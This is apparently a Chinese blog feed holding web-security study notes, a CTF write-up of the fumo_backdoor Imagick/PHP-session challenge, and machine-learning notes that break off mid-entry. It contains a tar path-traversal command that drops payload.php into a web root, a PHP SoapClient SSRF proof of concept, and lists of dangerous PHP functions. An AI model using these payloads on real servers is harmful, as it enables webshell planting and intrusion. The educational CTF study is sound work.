服务的端口，用来捕获黑客的 SSH 爆破行为<br>23 端口：Telnet 服务，命令执行服务，用来探测黑客对于 telnet 的爆破<br>80 端口/443 端口：WEB 服务的端口，用来捕获黑客的 WEB 攻击行为特征<br>1521：oracle 数据库开放端口，捕获黑客的 oracle 爆破行为,UDF 命令执行等行为<br>3306：MYSQL 端口，用来捕获黑客对于 mysql 数据库的爆破行为，UDF 命令执行等行为<br>3389：Windows 远程桌面端口，用来捕获黑客的爆破行为<br><code>下面的相对来说不重要</code><br>6379 端口：REDIS 端口，捕获黑客 REDIS 未授权访问的攻击，黑客利用 redis 写 ssh 秘钥，写 webshell，执行计划任务等的攻击<br>445 端口：SMB 服务端口-黑客利用永恒之蓝 Enternalblue 的攻击行为，黑客的 SMB 账号爆破（通俗简单理解，爆破 windows 账号密码）<br>1433 端口：Microsoft SQLserver 端口，用来捕获黑客爆破 1433 端口的行为，并且查看黑客利用 sqlserver xp_cmdshell,sp_cmdshell 等组件命令执行的操作，存储过程的利用<br>135、139 端口：捕获黑客的利用 RPC 共享的攻击（当蜜罐部署在内网）</p><h1 id="面试小问题"><a href="#面试小问题" class="headerlink" title="面试小问题"></a>面试小问题</h1><h2 id="为什么-aspx-木马权限比-asp-大？"><a href="#为什么-aspx-木马权限比-asp-大？" class="headerlink" title="为什么 aspx 木马权限比 asp 大？"></a><strong>为什么 aspx 木马权限比 asp 大？</strong></h2><p>aspx 使用的是.net 技术。IIS 中默认不支持，ASP 只是脚本语言而已。</p><p>入侵的时候 asp 的木马一般是 guest 权限而 APSX 的木马一般是 users 权限。</p><h2 id="代码执行、文件读取、命令执行函数有哪些？"><a href="#代码执行、文件读取、命令执行函数有哪些？" class="headerlink" title="代码执行、文件读取、命令执行函数有哪些？"></a><strong>代码执行、文件读取、命令执行函数有哪些？</strong></h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>）代码执行：<br>eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function<br><span class="hljs-number">2</span>）文件读取：<br><span class="hljs-function"><span class="hljs-title">file_get_contents</span><span class="hljs-params">()</span></span>,<span class="hljs-built_in">highlight_file</span>(),<span class="hljs-built_in">fopen</span>(),<span class="hljs-built_in">readfile</span>(),<span class="hljs-built_in">fread</span>(),<span class="hljs-built_in">fgetss</span>(),<span class="hljs-built_in">fgets</span>(),<span class="hljs-built_in">parse_ini_file</span>(),<span class="hljs-built_in">show_source</span>(),<span class="hljs-built_in">file</span>()等<br><span class="hljs-number">3</span>)命令执行：<br><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span></span>, <span class="hljs-built_in">exec</span>(), <span class="hljs-built_in">shell_exec</span>(), <span class="hljs-built_in">passthru</span>() ,<span class="hljs-built_in">pcntl_exec</span>(),<span class="hljs-built_in">popen</span>(),<span class="hljs-built_in">proc_open</span>()<br></code></pre></td></tr></table></figure><h2 id="提权为何选择可读写目录？不用带空格的目录？"><a href="#提权为何选择可读写目录？不用带空格的目录？" class="headerlink" title="提权为何选择可读写目录？不用带空格的目录？"></a><strong>提权为何选择可读写目录？不用带空格的目录？</strong></h2><p>因为 exp 执行多半需要空格界定参数</p><h2 id="token-和-refer-横向对比-谁安全等级高？"><a href="#token-和-refer-横向对比-谁安全等级高？" class="headerlink" title="token 和 refer 横向对比 谁安全等级高？"></a><strong>token 和 refer 横向对比 谁安全等级高？</strong></h2><p>token 安全等级更高</p><h2 id="内存马怎么手工排查，不用工具，怎么手动杀内存马"><a href="#内存马怎么手工排查，不用工具，怎么手动杀内存马" class="headerlink" title="内存马怎么手工排查，不用工具，怎么手动杀内存马"></a><strong>内存马怎么手工排查，不用工具，怎么手动杀内存马</strong></h2><p>内存马如何排查：如果发现了一些内存 webshell 的痕迹，需要有一个排查的思路来进行跟踪和分析，也是根据各类型的原理，<br>1、如果是 jsp 注入，日志中排查可以 jsp 的访问请求。<br>2、如果是代码执行漏洞，排查中间件的 error.log,查看是否有可疑的报错，判断注入时间和方法。<br>3、根据业务使用的组件排查可能存在的 java 代码执行漏洞，spring 的 controller 了类型的话根据上报 webshell 的 url 查找日志，filter 或者 listener 类型，可能会有较多的 404 但是带有参数的请求。<br>杀马：<br>终止进程：如果确认某个进程是内存马，可以尝试终止该进程。在 Windows 系统中，可以通过任务管理器或者命令行工具 taskkill 来终止进程；在 Linux 系统中，可以通过命令行工具 kill 或者 pkill 来终止进程。<br>删除文件：如果进程终止后，还需要删除相关的文件，以防止内存马重新启动。在 Windows 系统中，可以直接删除相关文件；在 Linux 系统中，需要先终止进程，然后再删除文件。</p><h2 id="鱼叉和水坑"><a href="#鱼叉和水坑" class="headerlink" title="鱼叉和水坑"></a>鱼叉和水坑</h2><p>鱼叉攻击：指利用木马程序作为电子邮件的附件，发送到目标电脑上，诱导受害者去打开附件来感染木马</p><p>水坑攻击：分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，将网站攻破并植入恶意程序，等待目标访问</p><h2 id="企业安全"><a href="#企业安全" class="headerlink" title="企业安全"></a>企业安全</h2><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/YG16bcSjfo3kQmxRwypcYzSGnRe.png"></p><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/HZT7bYxxUoqQSyxHy5YcVnhEnPd.png"></p><h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/VaXxbvwCJo7MKOxdskScW8lyn7d.png"></p><h2 id="IDS-IPS"><a href="#IDS-IPS" class="headerlink" title="IDS/IPS"></a>IDS/IPS</h2><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/JshRb4zXqoPfyZx0Y6wcjU8Fn9b.png"></p><p>票据</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/WbcnbABAFoOopxxCnlrclP9LnWh.png"></p><h2 id="常见内网ip"><a href="#常见内网ip" class="headerlink" title="常见内网ip"></a>常见内网ip</h2><p>10.0.0.0/8<br>10.0.0.0 - 10.255.255.255<br>172.16.0.0/12<br>172.16.0.0 - 172.31.255.255<br>192.168.0.0/16<br>192.168.0.0 - 192.168.255.255</p><h2 id="DOS类"><a href="#DOS类" class="headerlink" title="DOS类"></a>DOS类</h2><p>ACK UDP ICMP FLOOD CC</p><p>CC攻击：针对web页面的</p><p>LAND攻击：源和请求地址相同</p><h1 id="web-零散知识"><a href="#web-零散知识" class="headerlink" title="web 零散知识"></a>web 零散知识</h1><h2 id="php-源码泄露问题"><a href="#php-源码泄露问题" class="headerlink" title="php 源码泄露问题"></a>php 源码泄露问题</h2><p>PHP<=7.4.21 时通过 <code>php -S</code> 的 WEB 服务器存在源码泄露漏洞，可以将 PHP 文件作为静态文件直接输出源码</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/FbbPbLpz4oqm3DxlkuJc4zJVnUc.png"></p><h2 id="tar-解压目录穿越"><a href="#tar-解压目录穿越" class="headerlink" title="tar 解压目录穿越"></a>tar 解压目录穿越</h2><blockquote><p><a href="https://blog.csdn.net/wanmiqi/article/details/110202417">https://blog.csdn.net/wanmiqi/article/details/110202417</a></p></blockquote><p>在 python 或者 Unix 下，使用 tar 压缩的文件名如果存在目录穿越，那么解压后的文件也会造成穿越</p><p><strong>ar cPvf shell.tar ../../../../../../../../var/www/html/testupload/payload.php</strong></p><h2 id="pickle-反序列化"><a href="#pickle-反序列化" class="headerlink" title="pickle 反序列化"></a>pickle 反序列化</h2><h2 id="yaml-反序列化"><a href="#yaml-反序列化" class="headerlink" title="yaml 反序列化"></a>yaml 反序列化</h2><h2 id="Phpsession-特性"><a href="#Phpsession-特性" class="headerlink" title="Phpsession 特性"></a>Phpsession 特性</h2><p><a href="https://juejin.cn/post/7079670019956670471">PHP session 反序列化漏洞原理解析 - 掘金 (juejin.cn)</a></p><ol><li>利用 session 上传文件（配合文件上传）</li><li>由于 php 序列化处理器的不同导致的反序列化</li></ol><h2 id="CRLF-注入"><a href="#CRLF-注入" class="headerlink" title="CRLF 注入"></a>CRLF 注入</h2><blockquote><p><a href="https://www.freebuf.com/column/202762.html">每日漏洞 | CRLF 注入 - FreeBuf 网络安全行业门户</a></p></blockquote><p>利用换行符和回车符导致注入 http 数据</p><h2 id="Nodejs-Ssrf-拆分攻击"><a href="#Nodejs-Ssrf-拆分攻击" class="headerlink" title="Nodejs Ssrf 拆分攻击"></a>Nodejs Ssrf 拆分攻击</h2><p>利用的是 nodejs 对于特殊字符的转换导致不能正常过滤掉控制字符/r/n 导致的 CRLF 注入</p><h2 id="Soap-ssrf"><a href="#Soap-ssrf" class="headerlink" title="Soap ssrf"></a>Soap ssrf</h2><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/HJfEbVnLWoVRcGx2g4Cc8j5nnYg.png"></p><p>结合 CRLF 注入：通过第二个参数控制 UA 间接可控制 content-type</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/80918004">SoapClient 反序列化 SSRF - 知乎 (zhihu.com)</a></p></blockquote><?php$target = 'http://127.0.0.1:5555/path';$post_string = 'data=something';$headers = array<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;X-Forwarded-For: 127.0.0.1&#x27;,<br><br>&#x27;Cookie: PHPSESSID=my_session&#x27;<br><br>);<br></code></pre></td></tr></table></figure>$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      => "aaab"));$aaa = serialize($b);$aaa = str_replace('^^',"\r\n",$aaa);$aaa = str_replace('&','&',$aaa);echo $aaa;$c = unserialize($aaa);$c->not_exists_function();?><h2 id="Phar-反序列化"><a href="#Phar-反序列化" class="headerlink" title="Phar 反序列化"></a>Phar 反序列化</h2><p>同时存在文件上传和和一些触发 phar 协议的函数的时候可以强制触发反序列化</p><h2 id="自动注册类函数-spl-autoload-register"><a href="#自动注册类函数-spl-autoload-register" class="headerlink" title="自动注册类函数 spl_autoload_register"></a>自动注册类函数 spl_autoload_register</h2><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/ZOupbGWGUoZwV1x2DG5cXyTKnid.png"></p><p>假如可以上传.inc 文件，同时存在反序列化，则将 webshell 修改为 inc 文件上传，记录上传的文件名，将他作序列化之后输入到反序列化的地方即 getshell</p><h2 id="Docker-PHP-裸文件本地包含"><a href="#Docker-PHP-裸文件本地包含" class="headerlink" title="Docker PHP 裸文件本地包含"></a>Docker PHP 裸文件本地包含</h2><p>只有文件包含但是无法上传文件，则需要利用本地文件</p><ol><li>日志包含：由于 Docker 将日志文件重定向，包含权限不足</li><li>Phpinfo 与条件竞争</li></ol><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/L2tUbrdnyo9QiTxKJTMc06mhnLc.png"></p><p>我们需要获取文件名，同时需要条件竞争</p><ol><li>window 通配符</li><li>session.upload_progress</li><li>pearcmd.php<ol start="4"><li></li></ol></li></ol><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/SGwYbK3Z2o4dbSxgByrc8j45nif.png"></p><ol start="7"><li></li></ol><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/SXVHbCgTuoXT3VxASFscTQv6nb2.png"></p><h2 id="DNS-域传送漏洞"><a href="#DNS-域传送漏洞" class="headerlink" title="DNS 域传送漏洞"></a>DNS 域传送漏洞</h2><blockquote><p><a href="https://cloud.tencent.com/developer/article/1555532">https://cloud.tencent.com/developer/article/1555532</a></p></blockquote><p>DNS 备份服务器通过"域传送"从主服务器上复制数据，如果域传送被攻击者利用就会导致整个网络拓扑泄露，一般使用 privateDNS 防御（内外网分离），限制区域传送 ip 并且设置 TSIG key</p><p>利用：nslookup -type=ns 域名</p><p>然后进入交互模式 ls 列出域名--> 是否可以列出域</p><p>kali 下 dig 发送 axfr 请求，要求返回某个区域全部记录 dnsenum dnswalk 都可以</p><h2 id="未设置-spf-导致邮箱任意伪造"><a href="#未设置-spf-导致邮箱任意伪造" class="headerlink" title="未设置 spf 导致邮箱任意伪造"></a>未设置 spf 导致邮箱任意伪造</h2><blockquote><p><a href="https://www.cnblogs.com/wkzb/p/15401932.html">https://www.cnblogs.com/wkzb/p/15401932.html</a><br><a href="https://www.cnblogs.com/wkzb/p/15553178.html">https://www.cnblogs.com/wkzb/p/15553178.html</a><br><a href="https://mp.weixin.qq.com/s/tOOBZ1aC6SsjslCM70WKBQ">https://mp.weixin.qq.com/s/tOOBZ1aC6SsjslCM70WKBQ</a> 邮件伪造</p></blockquote><h3 id="SPF"><a href="#SPF" class="headerlink" title="SPF"></a>SPF</h3><p>Sender Policy Framework 简单来说就是通过修改 SPF 记录来导致邮件任意发送</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/Yz88bpKUBoiogBxG54WcIAA4n07.png"></p><h4 id="查看方式"><a href="#查看方式" class="headerlink" title="查看方式"></a>查看方式</h4><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/W8rubjDC8op8f7xYngNcAkgFn19.png"></p><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/RMunbmJG5o06lsx4MhfcUmfinmd.png"></p><p>SPF 显然有其局限性，当用户 A 发邮件给 B，B 再转发给 C 的时候，SPF 将邮件的发件人转换为 B，这个时候就产生了 DKIM 技术</p><h3 id="DKIM"><a href="#DKIM" class="headerlink" title="DKIM"></a>DKIM</h3><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/NJ2Ib4fFqok4wXxSXEVcipkcnEe.png"></p><p>利用了公开密钥提供了身份验证和数字签名功能防止伪造篡改。</p><h4 id="查看方式-1"><a href="#查看方式-1" class="headerlink" title="查看方式"></a>查看方式</h4><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/YyCIbMQQEoMKQfxXRl0cT7Kcnyd.png"></p><h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/AQVWbiG1YoPy1AxHXyxcBE0snJf.png"></p><p>说实话看的不是很明白</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/MUISbyRGeoUEZBxa0TLc7HKOnkc.png"></p><h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1>]]></content>
    
    
    <categories>
      
      <category>web知识</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>fumo_backdoor复现</title>
    <link href="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>php代码审计，phpsession反序列化利用</p><h2 id="Imgaick类"><a href="#Imgaick类" class="headerlink" title="Imgaick类"></a>Imgaick类</h2><p>（vid:msl与mvg协议)</p><h3 id="msl语法基础"><a href="#msl语法基础" class="headerlink" title="msl语法基础"></a>msl语法基础</h3><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/1fcf8e22a17c633d348dc10bd2451570.png" alt="截图"></p><h3 id="vid特性"><a href="#vid特性" class="headerlink" title="vid特性"></a>vid特性</h3><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/848906440bfb201ccc0ce5f5689e741c.png" alt="截图"></p><h3 id="3-msl脚本标签"><a href="#3-msl脚本标签" class="headerlink" title="3 msl脚本标签"></a>3 msl脚本标签</h3><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/dfd6fe5579b65520eaa4e8505e571de5.png" alt="截图">.</p><p>这题用到了上面的base64解密，据博客所说还可以直接使用inline:data:text&#x2F;8BIM;base64实现不符合PPM协议的数据写入</p><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/7498bfd512dd2684b33f562988997a92.png" alt="截图"></p><br/><p>接受两个参数，cmd可以实现清除&#x2F;tmp目录与反序列化。</p><p>data构造的链子很简单，__sleep绕过waf后可以实现任意文件读取可以无法触发（需要序列化），__wakeup存在new $class($argv),想到原生类，这里利用了Imagick类</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>三个利用点：需要触发sleep魔术方法来读取文件，同时wakeup会导致无参rce（并不可以直接利用）以及原生类利用（这里用到imagick）</p><p>利用imgick漏洞将flag移动到&#x2F;tmp目录之后</p><p>将一段恶意数据设置到&#x2F;tmp&#x2F;sessxxx目录下，path设置在flag相应目录</p><p>利用vid:msl:&#x2F;tmp&#x2F;php*上传上面的数据到&#x2F;tmp&#x2F;sess_user中</p><p>触发phpsess反序列化来调用wakeup</p><h2 id="0"><a href="#0" class="headerlink" title="0"></a>0</h2><p>清空tmp目录</p><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/f8b8571bcb7f9390f01b8c83d0e69bb2.png" alt="截图"></p><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>创建一个写入了脏数据的PPM图片，末尾是复制之后的flag路径，最终用来触发readfile函数</p><blockquote><p><a href="https://github.com/ImageMagick/ImageMagick/blob/main/www/formats.html">https://github.com/ImageMagick/ImageMagick/blob/main/www/formats.html</a></p></blockquote><p>（PPM图片允许末尾写入脏数据并且不被imagic忽略）</p><br/><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/185f0736880412afc3b83c963e308892.png" alt="截图"></p><p>则在末尾写入数据,重要的是数据的大小要符合PPM要求</p><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/7f6a7e609d6b27fbb324b2960149bef6.png" alt="截图"></p><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/cf76657af9f1518ef05dc60103b468bc.png" alt="截图"></p><br/><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>触发wakeup魔术方法利用imagick把上面的图片存入sess_user中</p><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/3f1d0fb4e117b8c3449602b3ec5765c5.png" alt="截图"></p><p>将上面的图片数据修改为对应格式<img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/db561b80a3827e9584b64354f5ee767d.png" alt="截图"></p><p>本身是想用postman上传的，但是没找着发包的内容导致检查不了，就直接用bp发包了</p><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/1d902bf270a623ee5e8132229547abc5.png" alt="截图"></p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>imagick的mvg协议将flag复制到res中</p><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/c1860808ffa62ecfc54d11a4936bff0e.png" alt="截图"></p><br/><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>启动session传入PHPSESSION反序列化sess_user来触发__sleep方法</p><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/e247883ae9dc771e95c8ffe6abbbfa1b.png" alt="截图"></p><pre><code class="hljs">    最后发包就应该能获取flag的，这里可能本地环境有点问题....复现的大佬也说有时候要多试几次，我这边一直没出![截图](93b0dda5e3dba6abe80ceccaf4d888b3.png)</code></pre><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>最后整理一下漏洞触发的流程</p><p>当我们开启session并且访问对应的php_user文件时会将他的内容反序列化，</p><p>这个文件是先前被攻击者利用imagick恶意写入的，因此存在脏数据（反序列化时会访问&#x2F;tmp&#x2F;xxx文件）</p><p>并且攻击者已经利用imagick协议将flag写入到&#x2F;tmp&#x2F;xxx文件中</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote><p><a href="https://www.yuque.com/dat0u/ctf/utr6r6bhaltes2yv">https://www.yuque.com/dat0u/ctf/utr6r6bhaltes2yv</a></p><p><a href="https://aecous.github.io/2023/06/27/Imagick%E8%A7%A6%E5%8F%91msl/#%E6%A0%B7%E9%A2%98-ciscn2022-backdoor">https://aecous.github.io/2023/06/27/Imagick%E8%A7%A6%E5%8F%91msl/#%E6%A0%B7%E9%A2%98-ciscn2022-backdoor</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>ctf</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习</title>
    <link href="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>雕刻：决定项目内容，界定范围</p><p>收集数据，确认标签</p><p>训练，错误分析，迭代</p><p>监控性能，维持</p><h3 id="监督学习和非监督学习"><a href="#监督学习和非监督学习" class="headerlink" title="监督学习和非监督学习"></a>监督学习和非监督学习</h3><p>前者给出明确数据集，后者自动优化算法实现分类</p><h3 id="多类特征"><a href="#多类特征" class="headerlink" title="多类特征"></a>多类特征</h3><p>上标 i 说明是第几组数据（一个列表），下标 j 是一组数据中的第几个的特征值</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/Mthzb7XIUogEntxwU92c5gh6nTd.png"></p><h3 id="特征缩放"><a href="#特征缩放" class="headerlink" title="特征缩放"></a>特征缩放</h3><p>通过对数据权重的缩放来保证机器学习的合理性</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/S53fbcb1Vo1dWFxtoBtcGvFgnqd.png"></p><p>例如上图数据，x1 权重高导致 x 的轻微改变都会导致数据变化过大，从而成本函数等高线图是一个椭圆，梯度下降难以进行，总体上让数据接近 1</p><p>方法：</p><p>除以最大值</p><p>均值归一  减去平均值然后除以最大最小值的差</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/K2j7btkf6o6zAIxggI2czn8ynjf.png"></p><p>z-score 归一化 减去平均值除以标准差</p><h3 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h3><p>例如房子使用 wx1+wx2+b 来估测，x1 与 x2 是长和宽 可以建立一个 x3 为面积 然后用 w3+wx1+wx2+ 估测</p><h3 id="数据增强"><a href="#数据增强" class="headerlink" title="数据增强"></a>数据增强</h3><p>改变数据（例如旋转图片，给图片加底噪）来增大数据集</p><h3 id="基线"><a href="#基线" class="headerlink" title="基线"></a>基线</h3><p>选择一个值来作为误差的参考值，例如识别图像时人的正确率</p><h3 id="迁移学习"><a href="#迁移学习" class="headerlink" title="迁移学习"></a>迁移学习</h3><p>利用已经训练过的神经网络，通过改变输出层的参数或者改变所有参数来应用于自身的模型</p><h3 id="误差度量"><a href="#误差度量" class="headerlink" title="误差度量"></a>误差度量</h3><p>例如现在有一个罕见的疾病，其发生率是百分之零点五，如今有多个算法，其中一个算法永远输出“没有疾病”，他的误差就只有百分之零点五，但是显然这个算法是没有意义的</p><p>精度：成功预测病人有病&#x2F;共预测病人有病数量</p><p>(预测的病人大概率是真的）</p><p>召回：成功预测病人有病&#x2F;真实病人有病数量</p><p>（有病的病人大概率被预测出来）</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/L6wTbAWiBoHRGIx8AwCc8T87nPc.png"></p><p>逻辑回归：当门槛升高，意味着需要更高的预测值才会判断有病，这会导致精度更高，同时召回更低</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/CJFNb11uAoD6oMxeOJPcMVNPnih.png"></p><p>计算 f1 score（调和平均数），较小的数据会导致分母过大，然后去总体大的数据</p><h2 id="监督学习算法"><a href="#监督学习算法" class="headerlink" title="监督学习算法"></a>监督学习算法</h2><h3 id="线性回归"><a href="#线性回归" class="headerlink" title="线性回归"></a>线性回归</h3><p>w 变化率，b 常数</p><h3 id="逻辑回归"><a href="#逻辑回归" class="headerlink" title="逻辑回归"></a>逻辑回归</h3><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/LrgPbMSqxowHACxh2RJcraXMnBb.png"></p><p>决策边界：wx+b＝0 也就是令 sigmoid 函数的参数为零，通过选择更合适的 z 函数会使得决策边界更加合理，从而良好的预测数据</p><p>g：sigmoid function</p><h3 id="softmax-回归"><a href="#softmax-回归" class="headerlink" title="softmax 回归"></a>softmax 回归</h3><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/QV6sbAN70oBsHFxhVqFcvyGKnog.png"></p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/ZV1IbrIHgoiIOOxKZHVcU9T5n6e.png"></p><h3 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h3><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/XlLlbccPqoDHuUxHkvRcYzw4ngr.png"></p><p>（输入层）特征向量 x 在隐藏层的作用下变成了激活值（此过程是多次重复的，次数取决于有几个隐藏层，输出的激活值个数取决于这一层中有多少个神经元，其本质类似于特征工程，是通过特定小逻辑回归（g 是 sigmoid function 也叫做激活函数，也可以是其他算法）</p><p>单元&#x2F;函数将输入的向量转化为几个激活值，例如：价格与运输费在一个神经元的作用下转换为“可负担性”）</p><p>最终进入输出层并给出结果（逻辑运算，这一步的算法取决于输出的需要是什么结果，例如二分法就可以用 sigmoid 函数）。层数&#x3D;隐藏 + 输出，</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/LlC0bTreBoli2axPe9bcjPzqnlZ.png"></p><p>上下标理解：如图层 3，w b 是第三层的参数，第一个 a 是第三层的输出值也是第四层的输入，第二个 a 是第二层的输出也是第三层的输入，下标代表第几个神经元</p><p>前向传播：神经元减少</p><p>多标签分类：对于某一组输入值需要进行多个二元判断，如有无汽车，有无单车，输出一个 01 数组</p><p>多成本分类：对于某一组输入值需要判断他的类型吗，如可以是汽车，单车，行人而非输出是与不是</p><h4 id="卷积"><a href="#卷积" class="headerlink" title="卷积"></a>卷积</h4><p>将图像矩阵二进制化，根据多个特征制作出多个卷积核，矩阵相乘实现卷积化，接下来对数据进行压缩同时避免过拟合的发生（池化），对一个区域内的数据取一个特定的值，最后来到激活层，一般使用 Relu 函数</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/LbcLbE39Zod5BkxjEZzc71FmnDg.png"></p><h4 id="激活函数"><a href="#激活函数" class="headerlink" title="激活函数"></a>激活函数</h4><p>当我们想要神经元根据输入的输出得到不同的输出的时候就需要考虑激活函数的使用</p><p>sigmoid 函数</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/TD2Hbd8M3oTMaYxep4gckhC3nlg.png"></p><p>ReLU 函数</p><p>隐藏层最多见的激活函数，其运算简单，坡度大便于进行梯度下降</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/LjYxbtFKconA38x7x4hcowAdnbd.png"></p><p>线性激活函数（无激活函数）</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/KxwJbMT0EoSlNrxYuLmcfMk8nKf.png"></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="决策树"><a href="#决策树" class="headerlink" title="决策树"></a>决策树</h3><p>根节点，决策节点，叶节点</p><h4 id="信息增益（熵的减少）"><a href="#信息增益（熵的减少）" class="headerlink" title="信息增益（熵的减少）"></a>信息增益（熵的减少）</h4><p>选择减少最多的</p><p>P：目标在这个分组中的数目   w：这个分组的总数除以分组前总数</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/H3NJbonoFoz3gSxxmdBcQfa9neL.png"></p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/NPuObTtrIo1SWWxvZjScgDyVneb.png"></p><h4 id="停止"><a href="#停止" class="headerlink" title="停止"></a>停止</h4><p>为了避免过度拟合，需要有终止条件</p><p>1.完全纯洁</p><p>2.限制最大深度</p><p>3.信息增益太小（熵减少的少）</p><p>4.某个节点例子过少</p><h4 id="树集合（Ensembles-tree）"><a href="#树集合（Ensembles-tree）" class="headerlink" title="树集合（Ensembles 